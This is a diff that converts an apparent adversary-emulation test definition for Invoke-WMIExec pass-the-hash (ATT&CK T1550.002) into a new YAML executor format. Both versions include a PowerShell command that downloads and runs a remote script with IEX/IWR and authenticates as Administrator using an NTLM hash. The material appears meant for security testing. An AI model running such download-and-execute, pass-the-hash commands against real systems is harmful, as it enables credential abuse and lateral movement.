@@ -1,4 +1,4 @@
-- id: 462617f7-1451-532a-9bcb-2dbeb17fec89
+- requirements: []
   name: Soumaia ART Tests - Invoke-WMIExec Pass the Hash
   description: 'Use Invoke-WMIExec to Pass the Hash
 
@@ -6,12 +6,14 @@
 
     [Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)'
   tactic: lateral-movement
-  technique:
-    attack_id: T1550.002
-    name: 'Use Alternate Authentication Material: Pass the Hash'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname
+  technique_id: T1550.002
+  technique_name: 'Use Alternate Authentication Material: Pass the Hash'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR ''https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1'' -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname'
+  id: 462617f7-1451-532a-9bcb-2dbeb17fec89
